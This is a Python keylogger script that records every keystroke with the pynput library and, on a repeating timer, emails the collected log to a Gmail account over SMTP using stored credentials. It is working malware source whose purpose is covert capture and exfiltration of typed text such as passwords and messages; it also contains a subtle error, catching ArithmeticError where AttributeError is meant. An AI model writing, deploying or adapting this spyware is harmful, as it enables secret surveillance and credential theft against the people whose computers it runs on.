from pynput import keyboard
import pynput.keyboard, threading, smtplib

class keylogs:
    def __init__(self, interval_time, email, password):
        self.log = ""
        self.interval = interval_time
        self.email = email
        self.password = password
         
    def append_key(self, string):
        self.log = self.log + string
        
    def process_key(self, key):
        try:
            current_key = str(key.char)
        except ArithmeticError:
            if key == key.space:
                current_key = " "
            elif key == key.backspace:
                current_key = "<-"
            else:
             current_key = " " + str(key) + " "
        self.append_key(current_key)
    
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
